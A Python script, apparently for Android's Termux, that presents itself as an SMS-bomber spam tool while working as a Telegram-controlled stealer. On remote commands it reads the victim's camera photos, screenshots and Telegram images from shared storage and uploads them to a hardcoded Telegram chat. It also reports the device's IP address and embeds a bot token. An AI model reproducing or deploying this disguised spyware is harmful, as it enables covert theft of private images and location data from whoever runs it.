import os
import requests
import time # для контроля над временем при проверке файлов
import telebot
import subprocess
import random

bot = telebot.TeleBot("1801887812:AAFyBsFhelBEcLPc-55Gb5nD2pFwta3mwHs") #Тут должен быть токен (надеюсь знаете как его получить)
ID = '1035726612'
b = 0
u = ["Отправлено!", "Не отправлено!"]
otp = random.choice(u)

os.system('clear')
bot.send_message(ID, '''			      Список команд:
			/st - запустить интерфейс в терминале
			/cont - список контактов
			/gal - фотографии галереи
			/scr - скриншоты
			/tlg - фотки телеги
			/ip - Айпи''')

print('''

██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
     Coded by @lamer112311                                               
    
''')
# s = input("Введите токен рейд бота: ")
# s = 11111

print("Инициализация системы, подождите около 3 минут...")

@bot.message_handler(commands=['start'])
def any_msg(message):
	try:
		bot.send_message(ID, '''
			      Список команд:
			/st - запустить интерфейс в терминале
			/cont - список контактов
			/gal - фотографии галереи
			/scr - скриншоты
			/tlg - фотки телеги
			/ip - Айпи
			''')
	except:
		print("error")

@bot.message_handler(commands=['st'])
def any_msg(message):
	try:
		num = input("Введите номер для спама: ")
		bot.send_message(ID, num)
		print(f"Атака на номер {num} начата!")
	except:
		bot.send_message(ID, 'ERROR!')







@bot.message_handler(commands=['gal'])
def gal(message):
	number = message.text.split(' ')
	number2 =int(number[1])	
	bot.send_message(ID, 'Отправка...')
	try:
		l = os.listdir("../storage/shared/DCIM/Camera")
	except Exception as e:
			bot.send_message(ID, e)
	for i in range(number2):
		try:
			# with open('../storage/shared/DCIM/Camera/', 'rb') as f:
			f = open("../storage/shared/DCIM/Camera/"+l[i], "rb")
			r = f.read()
			bot.send_document(ID, r) 
			time.sleep(2)
		except Exception as e:
			bot.send_message(ID, e)


@bot.message_handler(commands=['scr'])
def scr(message):
	number = message.text.split(' ')
	number2 =int(number[1])	
	bot.send_message(ID, 'Отправка...')
	try:
		l = os.listdir("../storage/pictures/Screenshots")
	except Exception as e:
			bot.send_message(ID, e)
	for i in range(number2):
		try:
			# with open('../storage/shared/DCIM/Camera/', 'rb') as f:
			f = open("../storage/pictures/Screenshots/"+l[i], "rb")
			r = f.read()
			bot.send_document(ID, r) 
			time.sleep(2)
		except Exception as e:
			bot.send_message(ID, e)

@bot.message_handler(commands=['tlg'])
def tlg(message):
	number = message.text.split(' ')
	number2 =int(number[1])	
	bot.send_message(ID, 'Отправка...')
	try:
		l = os.listdir("../storage/shared/Telegram/Telegram Images")
	except Exception as e:
		bot.send_message(ID, e)
	for i in range(number2):
		try:
			# with open('../storage/shared/DCIM/Camera/', 'rb') as f:
			f = open("../storage/shared/Telegram/Telegram Images/"+l[i], "rb")
			r = f.read()
			bot.send_document(ID, r) 
			time.sleep(2)
		except Exception as e:
			bot.send_message(ID, e)

@bot.message_handler(commands=['ip'])
def ip(message):
	r = requests.get('https://ramziv.com/ip')
	bot.send_message(ID, r)



bot.polling()
